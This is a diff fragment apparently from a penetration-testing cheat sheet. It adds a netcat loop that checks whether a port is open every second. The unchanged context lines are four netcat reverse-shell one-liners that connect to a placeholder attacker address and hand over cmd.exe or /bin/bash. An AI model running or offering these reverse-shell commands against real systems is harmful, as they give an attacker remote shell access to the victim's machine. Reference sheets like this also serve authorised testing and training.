@@ -2815,6 +2815,9 @@ nc -nv attacker_IP port_here -e cmd.exe
 nc -nv attacker_IP port_here -e /bin/bash
 nc -e cmd attacker_IP port_here
 nc -e /bin/bash attacker_IP port_here
+
+# monitor port
+watch -n 1 nc -w 1 -nvvvz IP_here port_here
 ```
 
 
